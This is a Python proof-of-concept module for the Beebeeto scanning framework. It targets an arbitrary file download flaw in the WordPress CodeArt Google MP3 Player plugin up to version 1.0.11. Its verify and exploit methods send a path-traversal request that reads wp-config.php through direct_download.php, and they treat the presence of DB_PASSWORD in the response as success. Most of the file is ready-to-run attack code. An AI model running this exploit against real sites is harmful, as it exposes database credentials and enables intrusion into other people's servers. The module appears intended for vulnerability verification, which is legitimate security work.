#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib
import urllib2

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {  
          # poc相关信息  
          'poc': {  
              'id': 'poc-2015-0041',
              'name': 'Wordpress CodeArt Google MP3 Player Plugin <=1.0.11 /direct_download.php 任意文件下载漏洞 POC',
              'author': 'Tiny',
              'create_date': '2015-03-01',
          },  
          # 协议相关信息  
          'protocol': {  
              'name': 'http',
              'port': [80],
              'layer4_protocol': ['tcp'],
          },  
          # 漏洞相关信息  
          'vul': {  
              'app_name': 'Wordpress',
              'vul_version': ['<=1.0.11',], 
              'type': 'Arbitrary File Download',
              'tag': ['Wordpress CodeArt Google MP3 Player插件漏洞', '/direct_download.php','php'],
              'desc': '''
                      Wordpress CodeArt Google MP3 Player Plugin has file download in
                      do/direct_download.php.
                      ''',
              'references': ['http://www.exploit-db.com/exploits/35460/', 
              ],  
          },  
    }

    @classmethod
    def verify(cls, args):
        payload = 'file=../../../wp-config.php'
        path = '/wp-content/plugins/google-mp3-audio-player/direct_download.php?'
        verify_url = args['options']['target'] + path + payload
        request = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        response = urllib2.urlopen(request)
        reg = re.compile("DB_PASSWORD")
        if reg.findall(response.read()):
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify
    
if __name__ == '__main__':
    from pprint import pprint
    
    mp = MyPoc()
    pprint(mp.run())